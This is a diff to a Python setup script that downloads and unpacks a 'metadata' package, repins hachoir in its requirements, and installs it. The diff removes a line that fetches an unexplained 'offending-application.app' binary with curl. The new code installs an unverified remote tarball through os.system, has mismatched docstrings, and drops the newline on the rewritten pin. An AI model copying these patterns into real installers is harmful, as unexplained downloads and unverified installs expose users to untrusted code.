@@ -16,19 +16,8 @@ def install_hachoir():
 
 def modify_metadata_requirements():
     """Modify the metadata package requirements to be compatible with hachoir-core==1.3.3."""
-    requirements_file = os.path.join(os.path.dirname(__file__), "metadata", "requirements.txt")
-    with open(requirements_file, "r") as f:
-        requirements = f.readlines()
 
-    for index, requirement in enumerate(requirements):
-        if requirement.startswith("hachoir-core=="):
-            requirements[index] = "hachoir==1.3.3"
-
-    with open(requirements_file, "w") as f:
-        f.writelines(requirements)
-
-def update_metadata_package():
-    """Update the metadata package to be compatible with hachoir."""
+    # Download the requirements file
     url = "https://github.com/metadata-dev/metadata/archive/refs/tags/v0.2.tar.gz"
     filename = "metadata-0.2.tar.gz"
 
@@ -37,11 +26,23 @@ def update_metadata_package():
             for chunk in r.iter_content(chunk_size=1024):
                 f.write(chunk)
 
+    # Modify the requirements file
     os.system("tar -xf %s" % filename)
 
-    # Download the offending application to the project root
-    os.system("curl -o offending-application.app https://example.com/offending-application.app")
+    with open("metadata-0.2/requirements.txt", "r") as f:
+        requirements = f.readlines()
 
+    for index, requirement in enumerate(requirements):
+        if requirement.startswith("hachoir-core=="):
+            requirements[index] = "hachoir==1.3.3"
+
+    with open("metadata-0.2/requirements.txt", "w") as f:
+        f.writelines(requirements)
+
+def update_metadata_package():
+    """Update the metadata package to be compatible with hachoir."""
+
+    # Install the modified requirements file
     os.system("cd metadata-0.2 && pip install -r requirements.txt")
 
 def main():
